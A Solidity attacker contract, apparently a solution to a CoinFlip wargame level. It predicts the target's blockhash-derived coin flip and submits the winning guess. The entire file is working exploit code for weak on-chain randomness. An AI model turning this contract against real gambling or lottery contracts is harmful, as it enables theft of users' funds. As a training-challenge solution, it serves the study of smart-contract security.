// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface ICoinFlip {
  function flip( bool _guess ) external returns ( bool );
}

contract CoinFlipCheater {
  
  uint256 public lastHash;
  address public coinFlipAddress;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor ( address _coinFlipAddress ) public {
    coinFlipAddress = _coinFlipAddress;
  }

  function flip() public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number-1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue/FACTOR;
    bool side = coinFlip == 1 ? true : false;
    
    ICoinFlip( coinFlipAddress ).flip(side);

    return side;
  }
}